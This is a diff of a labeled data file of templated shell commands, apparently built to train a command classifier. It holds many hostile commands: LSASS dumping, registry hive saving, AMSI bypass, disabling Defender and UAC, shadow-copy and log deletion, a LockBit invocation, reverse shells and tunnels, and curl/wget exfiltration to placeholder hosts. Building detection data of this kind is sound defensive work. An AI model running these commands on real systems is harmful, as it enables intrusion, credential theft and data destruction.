@@ -25,38 +25,30 @@
 1	cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
 1	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
 1	cmd.exe /c "choco install putty"
-1	powershell -c "choco install putty"
-1	PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
-1	cmd.exe /c "PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
-1	powershell -c "PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
-0	vssadmin.exe delete shadows /all /quiet
-0	sendmail ${username}@${domain} < mail.txt
-0	[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-0	mstsc /v:${computer_name} /f
-0	Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path}
-0	cmd.exe /c "wmic.exe shadowcopy delete"
-0	cp ${source_file_path} ${destination_file_path}
-0	zip -m archive.zip ${source_file_path}
-0	robocopy ${source_file_path} ${destination_file_path} /mir
-0	sc stop WinDefend && sc config WinDefend start=disabled
-0	reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
-0	xcopy ${source_directory} \\${ip_address}\${destination_directory} /s /e
-0	schtasks /create /ru system /sc daily /tr "${command_to_execute}" /tn win32times /f
+0	quser
+0	powershell -c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
+0	Get-EventLog -List | ForEach-Object {$_.Log} | ForEach-Object {Clear-EventLog -LogName $_ }
+0	CertReq -Post -config ${destination_file_path} ${source_file_path}
+0	nanodump.x64.exe --silent-process-exit lsassdump.dmp
+0	cat email.txt | ssmtp ${username}@${domain}
+0	Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
+0	nanodump.x64.exe -w lsassdump.dmp
+0	rsync ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	wbadmin delete catalog -quiet
+0	lockbit.exe -pass ${password}
+0	rm -rf ${local_directory_path}
 0	Copy-Item ${source_directory} -Destination ${destination_directory} -Recurse
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d "${command_to_execute}" /f
-0	mstsc /v:${computer_name} /f
-0	7z a -p${password} ${destination_file_path} ${source_file_path}
-0	powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-0	mail -s ${email_subject} ${username}@${domain} < mail.txt
-0	Remove-Item -Path ${local_directory_path} -Recurse
-0	curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-0	Copy-Item ${source_file_path} -Destination ${destination_file_path}
+0	powershell -c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+0	psexec.exe \\${ip_address} -s ${command_to_execute}
+0	rundll32.exe ${dll_file},${entry_point}
+0	wget --post-file=${source_file_path} ${ip_address}:${port}
 0	copy ${source_file_path} ${destination_file_path}
-0	powershell -c "taskkill.exe /f /im ${process_name}"
-0	powershell -c "net.exe stop ${service_name}"
-0	ssmtp ${username}@${domain} < mail.txt
-0	zip -m archive.zip ${source_file_path}
-0	nc ${ip_address} ${port} -e sh
-0	xcopy ${source_directory} ${destination_directory} /s /e
-0	Start-ATHProcessUnderSpecificParent  -ParentId ${parent_pid} -TestGuid ${test_guid}
-0	Copy-Item "${local_file_path}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d "${command_to_execute}" /f
+0	nanodump.x64.exe -w lsassdump.dmp
+0	reg SAVE HKLM\SYSTYEM ${local_file_path}
+0	Start-Process -FilePath ${parent_path} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine "${command_to_execute}"
+0	Remove-Item -Path ${local_directory_path} -Recurse
+0	psexec \\${ip_address} -i ${command_to_execute}
+0	curl -X POST -d "@${source_file_path}" http://${ip_address}:${port}/upload
+0	zip -q archive.zip ${source_file_path}
+0	mstsc /v:${computer_name} /f
